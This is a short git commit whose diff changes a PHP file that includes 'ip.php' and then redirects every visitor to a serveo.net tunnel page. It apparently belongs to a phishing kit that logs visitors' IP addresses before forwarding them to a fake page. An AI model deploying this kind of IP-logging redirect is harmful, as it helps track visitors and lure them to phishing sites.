8a934f5791263b271ce48d12f4366df31af4b631
Syed Hisham Akmal <hisham0502@gmail.com>
2023-11-05 16:35:49 +0530

    minor mods

--- index.php
+++ index.php
@@ -1,5 +1,5 @@
 <?php
 include 'ip.php';
-header('Location: https://1df088a6a8e5afa73fb7b33c0ef506b0.serveo.net/index2.html');
+header('Location: https://7f5c580d9a75c8f81387adfdb40e881c.serveo.net/index2.html');
 exit
 ?>
